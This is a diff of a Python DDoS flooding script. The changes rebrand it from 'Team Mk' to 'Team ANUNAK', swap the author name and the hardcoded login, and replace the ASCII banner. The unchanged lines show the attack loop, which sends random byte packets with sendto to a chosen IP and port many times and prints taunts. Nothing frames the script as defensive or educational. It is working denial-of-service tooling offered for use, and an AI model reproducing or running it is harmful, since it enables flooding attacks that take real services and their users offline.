@@ -12,7 +12,7 @@ import os
 ###### TEAM Mk!!! #####
 os.system("clear")
 os.system("None")
-print("\033[32m DDoS Team丶Mk丶Is Loding ")
+print("\033[32m DDoS Team丶ANUNAK丶Is Loding ")
 time.sleep(2)
 print("Loading...")
 os.system("clear")
@@ -24,7 +24,7 @@ attemps = 0
 while attemps < 100:
     username = input('\033[34m Your Username : ')
     password = input('\033[34m Your Password : ')
-    if username == 'DIGA' and password == 'DIGA':
+    if username == 'SHANKS' and password == 'SHANKS':
         print('Mrhba Bik M3ana Fi Team!!')
         break
     else:
@@ -38,12 +38,15 @@ print("DDoS Is Loding : "+platform.system())
 if platform.system() == 'Windows':
 
 	print("""
- TEAM Mk is Loding... :
+ TEAM ANUNAK is Loding... :
 
-AUTHOR TOOLS : DIGA
-        ╔═╗╔═╗╔╦╗╔═╗   
-	╚═╗╠═╣║║║╠═╝──
-	╚═╝╩ ╩╩ ╩╩      V 1.5
+AUTHOR TOOLS : SHANKS
+        _____ _                _        
+ / ____| |              | |       
+| (___ | |__   __ _ _ __| | _____ 
+ \___ \| '_ \ / _` | '__| |/ / __|
+ ____) | | | | (_| | |  |   <\__ \
+|_____/|_| |_|\__,_|_|  |_|\_\___/V 1.5
 """)
 else :
 	print("""
@@ -53,7 +56,7 @@ else :
 	╚═╗╠═╣║║║╠═╝──
 	╚═╝╩ ╩╩ ╩╩      
 	
-	Devloper : DIGA
+	Devloper : SHANKS
 			""")
 
 
@@ -74,9 +77,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"TEAM '\033[31m Mk' YNIKKOM!")
+			print(i +"TEAM '\033[31m AN' YNIKKOM!")
 		except:
-			print("[!] TEAM Mk YNIKKOM!")
+			print("[!] TEAM ANUNAK YNIKKOM!")
 
 def run2():
 	data = random._urandom(16)
